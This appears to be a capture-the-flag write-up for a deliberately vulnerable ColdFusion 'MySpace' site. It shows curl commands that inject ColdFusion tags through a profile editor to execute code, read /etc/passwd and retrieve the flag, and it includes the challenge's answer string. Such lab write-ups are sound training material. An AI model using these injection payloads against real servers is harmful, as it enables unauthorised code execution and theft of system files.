# HackThePlanet - MySpace

**Points:** 100

**Description:** Extract flag from vulnerable MySpace site

## Challenge

It's 2003 and your cute alternative crush from school just gave you their MySpace handle. Upon checking out the site, you discover it is more unstable than they are....

**IP:** `<ip>`

**Port:** 8500

## Steps

### Step 1

Hit the target with curl:

```bash
curl -v http://<ip>:8500
```

Server responded with a `302 Found` redirect to `/login.cfm`.

Cookies `CFID` and `CFTOKEN` indicate a ColdFusion backend (`.cfm`).

### Step 2

Visited `/login.cfm`, login page with SIGN UP / LOGIN forms using `actionType`.

Exposed CFIDE path checked:

```bash
curl -v http://<ip>:8500/CFIDE/administrator/
```

ColdFusion Administrator page exposed publicly.

### Step 3

Registered a test account:

```bash
curl -v -X POST http://<ip>:8500/login.cfm \
  -d "username=testuser&password=testpass&actionType=register" \
  -c cookies.txt -L
```

Redirected to:

```
profiles/testuser.cfm
```

Each user profile is stored as a `.cfm` file. Since `.cfm` files execute server-side, injected ColdFusion code runs when the profile is viewed.

Profile page includes an **Edit My Page** feature (`index.cfm`) which submits raw HTML to `saveProfile.cfm`.

### Step 4

SSTI identified:

1. Profile editor accepts unsanitized input
2. Input is written to executable `.cfm` files

Tested with `Now()`:

```bash
curl -v -X POST http://<ip>:8500/saveProfile.cfm \
  -b cookies.txt \
  --data-urlencode 'profileHTML=<cfoutput>#Now()#</cfoutput>' \
  -L
```

Visiting `profiles/testuser.cfm` returned:

```
{ts '2026-03-21 05:08:05'}
```

server-side code execution (SSTI) confirmed.

### Step 5

Read `/etc/passwd`:

```bash
curl -v -X POST http://<ip>:8500/saveProfile.cfm \
  -b cookies.txt \
  --data-urlencode 'profileHTML=<cfoutput>#fileRead("/etc/passwd")#</cfoutput>' \
  -L
```

File contents returned, confirming arbitrary file read.

### Step 6

Read flag content with this command:

```bash
curl -v -X POST http://<ip>:8500/saveProfile.cfm \
  -b cookies.txt \
  --data-urlencode 'profileHTML=<cfoutput>#fileRead("/home/ubuntu/flag.txt")#</cfoutput>' \
  -L
```

The profile page returned `HTPCTF{SSTI_IS_STILL_COOL_IN_DA_90S}`

---
## Answer

- answer: `HTPCTF{SSTI_IS_STILL_COOL_IN_DA_90S}`

---
## Note

Unfortunately not many images were taken during this CTF challenge, I tried my best to explain what occurred as much as possible

---